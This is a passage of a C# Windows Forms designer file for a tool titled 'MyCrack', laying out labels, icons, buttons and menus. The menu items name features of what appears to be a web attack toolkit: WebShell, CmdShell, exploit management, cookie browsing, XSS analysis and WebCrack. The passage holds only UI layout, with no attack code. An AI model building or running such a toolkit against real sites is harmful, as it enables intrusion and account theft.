            this.lbl_IE8count.TabIndex = 91;
            this.lbl_IE8count.Text = " IE8";
            // 
            // lbl_IE7count
            // 
            this.lbl_IE7count.AutoSize = true;
            this.lbl_IE7count.Location = new System.Drawing.Point(33, 108);
            this.lbl_IE7count.Name = "lbl_IE7count";
            this.lbl_IE7count.Size = new System.Drawing.Size(29, 12);
            this.lbl_IE7count.TabIndex = 90;
            this.lbl_IE7count.Text = " IE7";
            // 
            // lbl_IE6count
            // 
            this.lbl_IE6count.AutoSize = true;
            this.lbl_IE6count.Location = new System.Drawing.Point(33, 86);
            this.lbl_IE6count.Name = "lbl_IE6count";
            this.lbl_IE6count.Size = new System.Drawing.Size(29, 12);
            this.lbl_IE6count.TabIndex = 89;
            this.lbl_IE6count.Text = " IE6";
            // 
            // pictureBox20
            // 
            this.pictureBox20.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox20.Image")));
            this.pictureBox20.Location = new System.Drawing.Point(11, 196);
            this.pictureBox20.Name = "pictureBox20";
            this.pictureBox20.Size = new System.Drawing.Size(16, 16);
            this.pictureBox20.TabIndex = 88;
            this.pictureBox20.TabStop = false;
            // 
            // pictureBox21
            // 
            this.pictureBox21.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox21.Image")));
            this.pictureBox21.Location = new System.Drawing.Point(11, 174);
            this.pictureBox21.Name = "pictureBox21";
            this.pictureBox21.Size = new System.Drawing.Size(16, 16);
            this.pictureBox21.TabIndex = 87;
            this.pictureBox21.TabStop = false;
            // 
            // pictureBox18
            // 
            this.pictureBox18.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox18.Image")));
            this.pictureBox18.Location = new System.Drawing.Point(11, 152);
            this.pictureBox18.Name = "pictureBox18";
            this.pictureBox18.Size = new System.Drawing.Size(16, 16);
            this.pictureBox18.TabIndex = 86;
            this.pictureBox18.TabStop = false;
            // 
            // pictureBox19
            // 
            this.pictureBox19.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox19.Image")));
            this.pictureBox19.Location = new System.Drawing.Point(11, 130);
            this.pictureBox19.Name = "pictureBox19";
            this.pictureBox19.Size = new System.Drawing.Size(16, 16);
            this.pictureBox19.TabIndex = 85;
            this.pictureBox19.TabStop = false;
            // 
            // pictureBox17
            // 
            this.pictureBox17.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox17.Image")));
            this.pictureBox17.Location = new System.Drawing.Point(11, 108);
            this.pictureBox17.Name = "pictureBox17";
            this.pictureBox17.Size = new System.Drawing.Size(16, 16);
            this.pictureBox17.TabIndex = 84;
            this.pictureBox17.TabStop = false;
            // 
            // pictureBox16
            // 
            this.pictureBox16.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox16.Image")));
            this.pictureBox16.Location = new System.Drawing.Point(11, 86);
            this.pictureBox16.Name = "pictureBox16";
            this.pictureBox16.Size = new System.Drawing.Size(16, 16);
            this.pictureBox16.TabIndex = 83;
            this.pictureBox16.TabStop = false;
            // 
            // pictureBox15
            // 
            this.pictureBox15.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox15.Image")));
            this.pictureBox15.Location = new System.Drawing.Point(95, 53);
            this.pictureBox15.Name = "pictureBox15";
            this.pictureBox15.Size = new System.Drawing.Size(16, 16);
            this.pictureBox15.TabIndex = 82;
            this.pictureBox15.TabStop = false;
            // 
            // lbl_XssInfo
            // 
            this.lbl_XssInfo.AutoSize = true;
            this.lbl_XssInfo.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.lbl_XssInfo.Location = new System.Drawing.Point(9, 53);
            this.lbl_XssInfo.Name = "lbl_XssInfo";
            this.lbl_XssInfo.Size = new System.Drawing.Size(59, 12);
            this.lbl_XssInfo.TabIndex = 13;
            this.lbl_XssInfo.Text = "记录统计:";
            // 
            // comboBox3
            // 
            this.comboBox3.FormattingEnabled = true;
            this.comboBox3.Location = new System.Drawing.Point(176, 20);
            this.comboBox3.Name = "comboBox3";
            this.comboBox3.Size = new System.Drawing.Size(79, 20);
            this.comboBox3.TabIndex = 12;
            this.comboBox3.Text = "地址位置";
            // 
            // label25
            // 
            this.label25.AutoSize = true;
            this.label25.Location = new System.Drawing.Point(9, 20);
            this.label25.Name = "label25";
            this.label25.Size = new System.Drawing.Size(59, 12);
            this.label25.TabIndex = 11;
            this.label25.Text = "筛选条件:";
            // 
            // comboBox2
            // 
            this.comboBox2.FormattingEnabled = true;
            this.comboBox2.Location = new System.Drawing.Point(84, 20);
            this.comboBox2.Name = "comboBox2";
            this.comboBox2.Size = new System.Drawing.Size(76, 20);
            this.comboBox2.TabIndex = 10;
            this.comboBox2.Text = "漏洞编号";
            // 
            // btn_OpenXssDB
            // 
            this.btn_OpenXssDB.Location = new System.Drawing.Point(867, 18);
            this.btn_OpenXssDB.Name = "btn_OpenXssDB";
            this.btn_OpenXssDB.Size = new System.Drawing.Size(102, 23);
            this.btn_OpenXssDB.TabIndex = 9;
            this.btn_OpenXssDB.Text = "打开XSS数据库";
            this.btn_OpenXssDB.UseVisualStyleBackColor = true;
            this.btn_OpenXssDB.Click += new System.EventHandler(this.btn_OpenXssDB_Click);
            // 
            // tab_Introduction
            // 
            this.tab_Introduction.Controls.Add(this.txt_About);
            this.tab_Introduction.ImageIndex = 85;
            this.tab_Introduction.Location = new System.Drawing.Point(4, 4);
            this.tab_Introduction.Name = "tab_Introduction";
            this.tab_Introduction.Padding = new System.Windows.Forms.Padding(3);
            this.tab_Introduction.Size = new System.Drawing.Size(980, 623);
            this.tab_Introduction.TabIndex = 2;
            this.tab_Introduction.Text = "History";
            this.tab_Introduction.UseVisualStyleBackColor = true;
            // 
            // txt_About
            // 
            this.txt_About.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
                        | System.Windows.Forms.AnchorStyles.Left)
                        | System.Windows.Forms.AnchorStyles.Right)));
            this.txt_About.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.txt_About.Location = new System.Drawing.Point(5, 1);
            this.txt_About.Multiline = true;
            this.txt_About.Name = "txt_About";
            this.txt_About.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.txt_About.Size = new System.Drawing.Size(968, 617);
            this.txt_About.TabIndex = 48;
            this.txt_About.Text = resources.GetString("txt_About.Text");
            this.txt_About.TextChanged += new System.EventHandler(this.txt_About_TextChanged);
            // 
            // imageList_tab
            // 
            this.imageList_tab.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList_tab.ImageStream")));
            this.imageList_tab.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList_tab.Images.SetKeyName(0, "cpu.bmp");
            this.imageList_tab.Images.SetKeyName(1, "world.bmp");
            this.imageList_tab.Images.SetKeyName(2, "system.bmp");
            this.imageList_tab.Images.SetKeyName(3, "bat.bmp");
            this.imageList_tab.Images.SetKeyName(4, "vbs.bmp");
            this.imageList_tab.Images.SetKeyName(5, "find.bmp");
            this.imageList_tab.Images.SetKeyName(6, "del2.bmp");
            this.imageList_tab.Images.SetKeyName(7, "shutdown.bmp");
            this.imageList_tab.Images.SetKeyName(8, "exe.bmp");
            this.imageList_tab.Images.SetKeyName(9, "video.bmp");
            this.imageList_tab.Images.SetKeyName(10, "voice.bmp");
            this.imageList_tab.Images.SetKeyName(11, "set (2).bmp");
            this.imageList_tab.Images.SetKeyName(12, "search (2).bmp");
            this.imageList_tab.Images.SetKeyName(13, "net.bmp");
            this.imageList_tab.Images.SetKeyName(14, "notepad.bmp");
            this.imageList_tab.Images.SetKeyName(15, "foler.bmp");
            this.imageList_tab.Images.SetKeyName(16, "cut2.bmp");
            this.imageList_tab.Images.SetKeyName(17, "cut1.bmp");
            this.imageList_tab.Images.SetKeyName(18, "qq.bmp");
            this.imageList_tab.Images.SetKeyName(19, "syssafe.bmp");
            this.imageList_tab.Images.SetKeyName(20, "ie.bmp");
            this.imageList_tab.Images.SetKeyName(21, "refesh2.bmp");
            this.imageList_tab.Images.SetKeyName(22, "go.bmp");
            this.imageList_tab.Images.SetKeyName(23, "copyRight.bmp");
            this.imageList_tab.Images.SetKeyName(24, "cache.bmp");
            this.imageList_tab.Images.SetKeyName(25, "cls.bmp");
            this.imageList_tab.Images.SetKeyName(26, "back.bmp");
            this.imageList_tab.Images.SetKeyName(27, "color.bmp");
            this.imageList_tab.Images.SetKeyName(28, "cmd.bmp");
            this.imageList_tab.Images.SetKeyName(29, "close.bmp");
            this.imageList_tab.Images.SetKeyName(30, "save.bmp");
            this.imageList_tab.Images.SetKeyName(31, "search.bmp");
            this.imageList_tab.Images.SetKeyName(32, "set.bmp");
            this.imageList_tab.Images.SetKeyName(33, "refesh.bmp");
            this.imageList_tab.Images.SetKeyName(34, "del.bmp");
            this.imageList_tab.Images.SetKeyName(35, "edit.bmp");
            this.imageList_tab.Images.SetKeyName(36, "add.bmp");
            this.imageList_tab.Images.SetKeyName(37, "exploit-db.ico");
            this.imageList_tab.Images.SetKeyName(38, "data_16.png");
            this.imageList_tab.Images.SetKeyName(39, "userinfo_16.png");
            this.imageList_tab.Images.SetKeyName(40, "info_16.png");
            this.imageList_tab.Images.SetKeyName(41, "bar.bmp");
            this.imageList_tab.Images.SetKeyName(42, "mp3.bmp");
            this.imageList_tab.Images.SetKeyName(43, "copyfile.bmp");
            this.imageList_tab.Images.SetKeyName(44, "copy.bmp");
            this.imageList_tab.Images.SetKeyName(45, "see eye.bmp");
            this.imageList_tab.Images.SetKeyName(46, "soso.bmp");
            this.imageList_tab.Images.SetKeyName(47, "360.bmp");
            this.imageList_tab.Images.SetKeyName(48, "yahoo.bmp");
            this.imageList_tab.Images.SetKeyName(49, "google.bmp");
            this.imageList_tab.Images.SetKeyName(50, "baidu.bmp");
            this.imageList_tab.Images.SetKeyName(51, "dataoutput_16.png");
            this.imageList_tab.Images.SetKeyName(52, "mysql_16.png");
            this.imageList_tab.Images.SetKeyName(53, "chrome_16.png");
            this.imageList_tab.Images.SetKeyName(54, "firefox_16.png");
            this.imageList_tab.Images.SetKeyName(55, "drupal_16.png");
            this.imageList_tab.Images.SetKeyName(56, "dataInput_16.png");
            this.imageList_tab.Images.SetKeyName(57, "edit_16_c.png");
            this.imageList_tab.Images.SetKeyName(58, "edit_sql_16.png");
            this.imageList_tab.Images.SetKeyName(59, "terminal_16.png");
            this.imageList_tab.Images.SetKeyName(60, "time_16.png");
            this.imageList_tab.Images.SetKeyName(61, "time2_16.png");
            this.imageList_tab.Images.SetKeyName(62, "dataUp_16.png");
            this.imageList_tab.Images.SetKeyName(63, "info3_16.png");
            this.imageList_tab.Images.SetKeyName(64, "set2_16.png");
            this.imageList_tab.Images.SetKeyName(65, "mysql1_16.png");
            this.imageList_tab.Images.SetKeyName(66, "bug_16.png");
            this.imageList_tab.Images.SetKeyName(67, "userpass_16.png");
            this.imageList_tab.Images.SetKeyName(68, "arrow_left_16.png");
            this.imageList_tab.Images.SetKeyName(69, "arrow_right_16.png");
            this.imageList_tab.Images.SetKeyName(70, "tag_16.png");
            this.imageList_tab.Images.SetKeyName(71, "dataup_16.png");
            this.imageList_tab.Images.SetKeyName(72, "paste_16.png");
            this.imageList_tab.Images.SetKeyName(73, "documents_16.png");
            this.imageList_tab.Images.SetKeyName(74, "mssql_16.png");
            this.imageList_tab.Images.SetKeyName(75, "inject_16.png");
            this.imageList_tab.Images.SetKeyName(76, "encode_16.png");
            this.imageList_tab.Images.SetKeyName(77, "cookie_16.png");
            this.imageList_tab.Images.SetKeyName(78, "Radar_green_16.png");
            this.imageList_tab.Images.SetKeyName(79, "Radar_Blue_16.png");
            this.imageList_tab.Images.SetKeyName(80, "data_metal_16.png");
            this.imageList_tab.Images.SetKeyName(81, "rocket_16.png");
            this.imageList_tab.Images.SetKeyName(82, "info4_16.png");
            this.imageList_tab.Images.SetKeyName(83, "DBup_16.png");
            this.imageList_tab.Images.SetKeyName(84, "DBdown_16.png");
            this.imageList_tab.Images.SetKeyName(85, "history_16.png");
            this.imageList_tab.Images.SetKeyName(86, "spider_16.png");
            this.imageList_tab.Images.SetKeyName(87, "radar2_16.png");
            this.imageList_tab.Images.SetKeyName(88, "radar_16.png");
            this.imageList_tab.Images.SetKeyName(89, "pie_chart_16.png");
            this.imageList_tab.Images.SetKeyName(90, "stop_16.png");
            this.imageList_tab.Images.SetKeyName(91, "radar2_16.png");
            // 
            // rm_ExpMgrBtn
            // 
            this.rm_ExpMgrBtn.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.expDeleteToolStripMenuItem,
            this.expUpdateToolStripMenuItem,
            this.sendToSubmitTestToolStripMenuItem,
            this.发送到DataOutputToolStripMenuItem,
            this.setTagToolStripMenuItem});
            this.rm_ExpMgrBtn.Name = "rightMenu_WebExpBtn";
            this.rm_ExpMgrBtn.Size = new System.Drawing.Size(185, 114);
            // 
            // expDeleteToolStripMenuItem
            // 
            this.expDeleteToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("expDeleteToolStripMenuItem.Image")));
            this.expDeleteToolStripMenuItem.Name = "expDeleteToolStripMenuItem";
            this.expDeleteToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.expDeleteToolStripMenuItem.Text = "删除EXP";
            this.expDeleteToolStripMenuItem.Click += new System.EventHandler(this.expDeleteToolStripMenuItem_Click);
            // 
            // expUpdateToolStripMenuItem
            // 
            this.expUpdateToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("expUpdateToolStripMenuItem.Image")));
            this.expUpdateToolStripMenuItem.Name = "expUpdateToolStripMenuItem";
            this.expUpdateToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.expUpdateToolStripMenuItem.Text = "修改EXP";
            this.expUpdateToolStripMenuItem.Click += new System.EventHandler(this.expUpdateToolStripMenuItem_Click);
            // 
            // sendToSubmitTestToolStripMenuItem
            // 
            this.sendToSubmitTestToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("sendToSubmitTestToolStripMenuItem.Image")));
            this.sendToSubmitTestToolStripMenuItem.Name = "sendToSubmitTestToolStripMenuItem";
            this.sendToSubmitTestToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.sendToSubmitTestToolStripMenuItem.Text = "发送到 ExploitDebug";
            this.sendToSubmitTestToolStripMenuItem.Click += new System.EventHandler(this.sendToSubmitTestToolStripMenuItem_Click);
            // 
            // 发送到DataOutputToolStripMenuItem
            // 
            this.发送到DataOutputToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("发送到DataOutputToolStripMenuItem.Image")));
            this.发送到DataOutputToolStripMenuItem.Name = "发送到DataOutputToolStripMenuItem";
            this.发送到DataOutputToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.发送到DataOutputToolStripMenuItem.Text = "发送到 DataOutput";
            this.发送到DataOutputToolStripMenuItem.Click += new System.EventHandler(this.发送到DataOutputToolStripMenuItem_Click);
            // 
            // setTagToolStripMenuItem
            // 
            this.setTagToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("setTagToolStripMenuItem.Image")));
            this.setTagToolStripMenuItem.Name = "setTagToolStripMenuItem";
            this.setTagToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
            this.setTagToolStripMenuItem.Text = "重点标记";
            this.setTagToolStripMenuItem.Click += new System.EventHandler(this.setTagToolStripMenuItem_Click);
            // 
            // rm_FileMgrTree
            // 
            this.rm_FileMgrTree.Name = "rm_FileMgrTree";
            this.rm_FileMgrTree.Size = new System.Drawing.Size(61, 4);
            // 
            // lbl_AppICO
            // 
            this.lbl_AppICO.BackColor = System.Drawing.Color.Black;
            this.lbl_AppICO.ContextMenuStrip = this.rm_appFunction;
            this.lbl_AppICO.Cursor = System.Windows.Forms.Cursors.Hand;
            this.lbl_AppICO.ForeColor = System.Drawing.Color.White;
            this.lbl_AppICO.Image = ((System.Drawing.Image)(resources.GetObject("lbl_AppICO.Image")));
            this.lbl_AppICO.Location = new System.Drawing.Point(4, 5);
            this.lbl_AppICO.Name = "lbl_AppICO";
            this.lbl_AppICO.Size = new System.Drawing.Size(16, 16);
            this.lbl_AppICO.TabIndex = 5;
            this.lbl_AppICO.Click += new System.EventHandler(this.lbl_AppICO_Click);
            this.lbl_AppICO.MouseHover += new System.EventHandler(this.lbl_AppICO_MouseHover);
            // 
            // rm_appFunction
            // 
            this.rm_appFunction.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.系统设置ToolStripMenuItem,
            this.toolStripMenuItem56,
            this.webShellToolStripMenuItem,
            this.expDebugToolStripMenuItem,
            this.encodeDecodeToolStripMenuItem,
            this.cookieBrowseToolStripMenuItem,
            this.fileManageToolStripMenuItem,
            this.cmdShellToolStripMenuItem,
            this.webCrackToolStripMenuItem,
            this.exploitDBToolStripMenuItem,
            this.dataOutputToolStripMenuItem,
            this.googleHackToolStripMenuItem,
            this.notepadToolStripMenuItem,
            this.xssAnalysisToolStripMenuItem,
            this.toolStripMenuItem51,
            this.updateToolStripMenuItem,
            this.introductionToolStripMenuItem});
            this.rm_appFunction.Name = "rm_appFunction";
            this.rm_appFunction.Size = new System.Drawing.Size(143, 346);
            // 
            // 系统设置ToolStripMenuItem
            // 
            this.系统设置ToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("系统设置ToolStripMenuItem.Image")));
            this.系统设置ToolStripMenuItem.Name = "系统设置ToolStripMenuItem";
            this.系统设置ToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.系统设置ToolStripMenuItem.Text = "SysSeting";
            // 
            // toolStripMenuItem56
            // 
            this.toolStripMenuItem56.Name = "toolStripMenuItem56";
            this.toolStripMenuItem56.Size = new System.Drawing.Size(139, 6);
            // 
            // webShellToolStripMenuItem
            // 
            this.webShellToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("webShellToolStripMenuItem.Image")));
            this.webShellToolStripMenuItem.Name = "webShellToolStripMenuItem";
            this.webShellToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.webShellToolStripMenuItem.Text = "WebShell";
            this.webShellToolStripMenuItem.Click += new System.EventHandler(this.webShellToolStripMenuItem_Click);
            // 
            // expDebugToolStripMenuItem
            // 
            this.expDebugToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("expDebugToolStripMenuItem.Image")));
            this.expDebugToolStripMenuItem.Name = "expDebugToolStripMenuItem";
            this.expDebugToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.expDebugToolStripMenuItem.Text = "ExpDebug";
            this.expDebugToolStripMenuItem.Click += new System.EventHandler(this.expDebugToolStripMenuItem_Click);
            // 
            // encodeDecodeToolStripMenuItem
            // 
            this.encodeDecodeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("encodeDecodeToolStripMenuItem.Image")));
            this.encodeDecodeToolStripMenuItem.Name = "encodeDecodeToolStripMenuItem";
            this.encodeDecodeToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.encodeDecodeToolStripMenuItem.Text = "EncodeDecode";
            this.encodeDecodeToolStripMenuItem.Click += new System.EventHandler(this.encodeDecodeToolStripMenuItem_Click);
            // 
            // cookieBrowseToolStripMenuItem
            // 
            this.cookieBrowseToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("cookieBrowseToolStripMenuItem.Image")));
            this.cookieBrowseToolStripMenuItem.Name = "cookieBrowseToolStripMenuItem";
            this.cookieBrowseToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.cookieBrowseToolStripMenuItem.Text = "CookieBrowse";
            this.cookieBrowseToolStripMenuItem.Click += new System.EventHandler(this.cookieBrowseToolStripMenuItem_Click);
            // 
            // fileManageToolStripMenuItem
            // 
            this.fileManageToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("fileManageToolStripMenuItem.Image")));
            this.fileManageToolStripMenuItem.Name = "fileManageToolStripMenuItem";
            this.fileManageToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.fileManageToolStripMenuItem.Text = "FileManage";
            this.fileManageToolStripMenuItem.Visible = false;
            this.fileManageToolStripMenuItem.Click += new System.EventHandler(this.fileManageToolStripMenuItem_Click);
            // 
            // cmdShellToolStripMenuItem
            // 
            this.cmdShellToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("cmdShellToolStripMenuItem.Image")));
            this.cmdShellToolStripMenuItem.Name = "cmdShellToolStripMenuItem";
            this.cmdShellToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.cmdShellToolStripMenuItem.Text = "CmdShell";
            this.cmdShellToolStripMenuItem.Click += new System.EventHandler(this.cmdShellToolStripMenuItem_Click);
            // 
            // webCrackToolStripMenuItem
            // 
            this.webCrackToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("webCrackToolStripMenuItem.Image")));
            this.webCrackToolStripMenuItem.Name = "webCrackToolStripMenuItem";
            this.webCrackToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.webCrackToolStripMenuItem.Text = "WebCrack";
            this.webCrackToolStripMenuItem.Visible = false;
            this.webCrackToolStripMenuItem.Click += new System.EventHandler(this.webCrackToolStripMenuItem_Click);
            // 
            // exploitDBToolStripMenuItem
            // 
            this.exploitDBToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("exploitDBToolStripMenuItem.Image")));
            this.exploitDBToolStripMenuItem.Name = "exploitDBToolStripMenuItem";
            this.exploitDBToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.exploitDBToolStripMenuItem.Text = "Exploit-DB";
            this.exploitDBToolStripMenuItem.Click += new System.EventHandler(this.exploitDBToolStripMenuItem_Click);
            // 
            // dataOutputToolStripMenuItem
            // 
            this.dataOutputToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("dataOutputToolStripMenuItem.Image")));
            this.dataOutputToolStripMenuItem.Name = "dataOutputToolStripMenuItem";
            this.dataOutputToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.dataOutputToolStripMenuItem.Text = "DataOutput";
            this.dataOutputToolStripMenuItem.Click += new System.EventHandler(this.dataOutputToolStripMenuItem_Click);
            // 
            // googleHackToolStripMenuItem
            // 
            this.googleHackToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("googleHackToolStripMenuItem.Image")));
            this.googleHackToolStripMenuItem.Name = "googleHackToolStripMenuItem";
            this.googleHackToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.googleHackToolStripMenuItem.Text = "GoogleHack";
            this.googleHackToolStripMenuItem.Visible = false;
            this.googleHackToolStripMenuItem.Click += new System.EventHandler(this.googleHackToolStripMenuItem_Click);
            // 
            // notepadToolStripMenuItem
            // 
            this.notepadToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("notepadToolStripMenuItem.Image")));
            this.notepadToolStripMenuItem.Name = "notepadToolStripMenuItem";
            this.notepadToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.notepadToolStripMenuItem.Text = "Notepad";
            this.notepadToolStripMenuItem.Visible = false;
            this.notepadToolStripMenuItem.Click += new System.EventHandler(this.notepadToolStripMenuItem_Click);
            // 
            // xssAnalysisToolStripMenuItem
            // 
            this.xssAnalysisToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("xssAnalysisToolStripMenuItem.Image")));
            this.xssAnalysisToolStripMenuItem.Name = "xssAnalysisToolStripMenuItem";
            this.xssAnalysisToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.xssAnalysisToolStripMenuItem.Text = "XssAnalysis";
            this.xssAnalysisToolStripMenuItem.Click += new System.EventHandler(this.xssAnalysisToolStripMenuItem_Click);
            // 
            // toolStripMenuItem51
            // 
            this.toolStripMenuItem51.Name = "toolStripMenuItem51";
            this.toolStripMenuItem51.Size = new System.Drawing.Size(139, 6);
            // 
            // updateToolStripMenuItem
            // 
            this.updateToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("updateToolStripMenuItem.Image")));
            this.updateToolStripMenuItem.Name = "updateToolStripMenuItem";
            this.updateToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.updateToolStripMenuItem.Text = "Update";
            this.updateToolStripMenuItem.Click += new System.EventHandler(this.updateToolStripMenuItem_Click);
            // 
            // introductionToolStripMenuItem
            // 
            this.introductionToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("introductionToolStripMenuItem.Image")));
            this.introductionToolStripMenuItem.Name = "introductionToolStripMenuItem";
            this.introductionToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.introductionToolStripMenuItem.Text = "History";
            this.introductionToolStripMenuItem.Click += new System.EventHandler(this.introductionToolStripMenuItem_Click);
            // 
            // 模块设置ToolStripMenuItem
            // 
            this.模块设置ToolStripMenuItem.Name = "模块设置ToolStripMenuItem";
            this.模块设置ToolStripMenuItem.Size = new System.Drawing.Size(32, 19);
            // 
            // lbl_appTitle
            // 
            this.lbl_appTitle.AutoSize = true;
            this.lbl_appTitle.BackColor = System.Drawing.SystemColors.Control;
            this.lbl_appTitle.ForeColor = System.Drawing.Color.Black;
            this.lbl_appTitle.Location = new System.Drawing.Point(26, 9);
            this.lbl_appTitle.Name = "lbl_appTitle";
            this.lbl_appTitle.Size = new System.Drawing.Size(47, 12);
            this.lbl_appTitle.TabIndex = 6;
            this.lbl_appTitle.Text = "MyCrack";
            // 
            // icoBtn_ExpDebug
            // 
            this.icoBtn_ExpDebug.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.icoBtn_ExpDebug.Image = ((System.Drawing.Image)(resources.GetObject("icoBtn_ExpDebug.Image")));
            this.icoBtn_ExpDebug.Location = new System.Drawing.Point(60, 30);
            this.icoBtn_ExpDebug.Name = "icoBtn_ExpDebug";
            this.icoBtn_ExpDebug.Size = new System.Drawing.Size(32, 32);
            this.icoBtn_ExpDebug.TabIndex = 15;
            this.icoBtn_ExpDebug.UseVisualStyleBackColor = true;
            this.icoBtn_ExpDebug.Click += new System.EventHandler(this.icoBtn_ExpDebug_Click);
            this.icoBtn_ExpDebug.MouseHover += new System.EventHandler(this.icoBtn_ExpDebug_MouseHover);
            // 
            // icoBtn_about
            // 
            this.icoBtn_about.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.icoBtn_about.Image = ((System.Drawing.Image)(resources.GetObject("icoBtn_about.Image")));
            this.icoBtn_about.Location = new System.Drawing.Point(460, 30);
            this.icoBtn_about.Name = "icoBtn_about";
            this.icoBtn_about.Size = new System.Drawing.Size(32, 32);
            this.icoBtn_about.TabIndex = 16;
            this.icoBtn_about.UseVisualStyleBackColor = true;
            this.icoBtn_about.Click += new System.EventHandler(this.icoBtn_about_Click);
            this.icoBtn_about.MouseHover += new System.EventHandler(this.icoBtn_about_MouseHover);
            // 
            // icoBtn_dataOutput
            // 
            this.icoBtn_dataOutput.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.icoBtn_dataOutput.Image = ((System.Drawing.Image)(resources.GetObject("icoBtn_dataOutput.Image")));
            this.icoBtn_dataOutput.Location = new System.Drawing.Point(310, 30);
            this.icoBtn_dataOutput.Name = "icoBtn_dataOutput";
            this.icoBtn_dataOutput.Size = new System.Drawing.Size(32, 32);
            this.icoBtn_dataOutput.TabIndex = 17;
            this.icoBtn_dataOutput.UseVisualStyleBackColor = true;
            this.icoBtn_dataOutput.Click += new System.EventHandler(this.icoBtn_dataOutput_Click);
            this.icoBtn_dataOutput.MouseHover += new System.EventHandler(this.icoBtn_dataOutput_MouseHover);
            // 
            // icoBtn_WebShell
            // 
            this.icoBtn_WebShell.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.icoBtn_WebShell.Image = ((System.Drawing.Image)(resources.GetObject("icoBtn_WebShell.Image")));
            this.icoBtn_WebShell.Location = new System.Drawing.Point(10, 30);
            this.icoBtn_WebShell.Name = "icoBtn_WebShell";
            this.icoBtn_WebShell.Size = new System.Drawing.Size(32, 32);
            this.icoBtn_WebShell.TabIndex = 18;
            this.icoBtn_WebShell.UseVisualStyleBackColor = true;
            this.icoBtn_WebShell.Click += new System.EventHandler(this.icoBtn_WebShell_Click);
            this.icoBtn_WebShell.MouseHover += new System.EventHandler(this.icoBtn_WebShell_MouseHover);
            // 
            // icoBtn_CookieBrowser
            // 
            this.icoBtn_CookieBrowser.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.icoBtn_CookieBrowser.Image = ((System.Drawing.Image)(resources.GetObject("icoBtn_CookieBrowser.Image")));
            this.icoBtn_CookieBrowser.Location = new System.Drawing.Point(160, 30);
            this.icoBtn_CookieBrowser.Name = "icoBtn_CookieBrowser";
            this.icoBtn_CookieBrowser.Size = new System.Drawing.Size(32, 32);
            this.icoBtn_CookieBrowser.TabIndex = 19;
            this.icoBtn_CookieBrowser.UseVisualStyleBackColor = true;
            this.icoBtn_CookieBrowser.Click += new System.EventHandler(this.icoBtn_CookieBrowser_Click);
            this.icoBtn_CookieBrowser.MouseHover += new System.EventHandler(this.icoBtn_CookieBrowser_MouseHover);
            // 
            // icoBtn_CmdShell
            // 
            this.icoBtn_CmdShell.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.icoBtn_CmdShell.Image = ((System.Drawing.Image)(resources.GetObject("icoBtn_CmdShell.Image")));
            this.icoBtn_CmdShell.Location = new System.Drawing.Point(210, 30);
            this.icoBtn_CmdShell.Name = "icoBtn_CmdShell";
            this.icoBtn_CmdShell.Size = new System.Drawing.Size(32, 32);
            this.icoBtn_CmdShell.TabIndex = 20;
            this.icoBtn_CmdShell.UseVisualStyleBackColor = true;
            this.icoBtn_CmdShell.Click += new System.EventHandler(this.icoBtn_CmdShell_Click);
